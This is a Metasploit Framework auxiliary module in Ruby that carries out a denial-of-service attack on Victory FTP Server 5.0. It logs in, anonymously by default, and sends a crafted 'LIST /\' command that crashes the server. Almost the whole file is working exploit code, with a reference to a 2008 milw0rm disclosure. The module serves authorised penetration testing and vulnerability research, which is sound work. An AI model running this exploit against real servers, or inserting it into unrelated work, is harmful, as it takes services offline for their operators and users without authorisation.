##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/ 
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Victory FTP Server 5.0 LIST DoS',
			'Description'    => %q{
				The Victory FTP Server v5.0 can be brought down by sending
				a very simple LIST command
			},
			'Author'         => 'kris',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[ [ 'URL', 'http://milw0rm.com/exploits/6834' ] ],
			'DisclosureDate' => 'Oct 24 2008'))

		# They're required
		register_options([
			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
		])
	end

	def run
		return unless connect_login

		print_status("Sending command...")

		# Try to wait for a response
		raw_send_recv("LIST /\\\r\n")

		disconnect
	end
end

